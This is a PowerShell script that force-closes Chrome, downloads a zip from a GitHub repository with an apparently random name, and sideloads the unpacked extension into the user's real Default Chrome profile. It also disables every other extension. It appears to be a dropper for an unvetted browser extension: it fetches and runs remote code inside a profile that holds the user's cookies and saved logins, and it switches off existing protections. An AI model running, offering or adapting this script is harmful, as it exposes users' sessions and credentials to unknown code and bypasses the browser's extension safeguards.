# Kill any running Chrome
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force

# ---------- CONFIG ----------
$zipUrl    = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip"
$workDir   = "C:\ExtTemp"
$extFolder = "$workDir\MyExtension"

# ---------- Auto-detect Chrome ----------
$chromeExe = $null

# 1) Try the PATH (portable or already on PATH)
$chromeExe = (Get-Command chrome -ErrorAction SilentlyContinue).Source

# 2) Registry: 64-bit Chrome on 64-bit Windows
if (-not $chromeExe) {
    $chromeExe = Get-ItemPropertyValue `
        -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' `
        -Name '(default)' -ErrorAction SilentlyContinue
}

# 3) Registry: 32-bit Chrome on 64-bit Windows
if (-not $chromeExe) {
    $chromeExe = Get-ItemPropertyValue `
        -Path 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe' `
        -Name '(default)' -ErrorAction SilentlyContinue
}

# 4) Common install folders
if (-not $chromeExe) {
    $candidates = @(
        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    )
    foreach ($c in $candidates) {
        if (Test-Path $c) { $chromeExe = $c; break }
    }
}

# 5) Nothing found → abort
if (-not $chromeExe) {
    Write-Host "[X] Chrome executable could not be located. Install Chrome or add it to PATH." -ForegroundColor Red
    exit 1
}

Write-Host "[i] Chrome found at: $chromeExe" -ForegroundColor Cyan

# ---------- 1. Download & extract ----------
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
$zipFile = "$workDir\extension.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile -UseBasicParsing

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile, "$workDir\_tmp")

# Find the folder that contains manifest.json
$manifest = Get-ChildItem "$workDir\_tmp" -Recurse -Filter manifest.json | Select-Object -First 1
if (-not $manifest) { Write-Host "[X] manifest.json not found" -ForegroundColor Red; exit }
$srcFolder = $manifest.Directory.FullName

# Move extension to final clean path
if (Test-Path $extFolder) { Remove-Item $extFolder -Recurse -Force }
Move-Item $srcFolder $extFolder

# ---------- 2. Launch Chrome with extension ----------
Start-Process $chromeExe -ArgumentList @(
    "--user-data-dir=`"$env:LOCALAPPDATA\Google\Chrome\User Data`"",
    "--profile-directory=Default",
    "--load-extension=`"$extFolder`"",
    "--no-first-run",
    "--disable-extensions-except=`"$extFolder`""
)

Write-Host "[OK] Extension downloaded and loaded in Default profile." -ForegroundColor Green
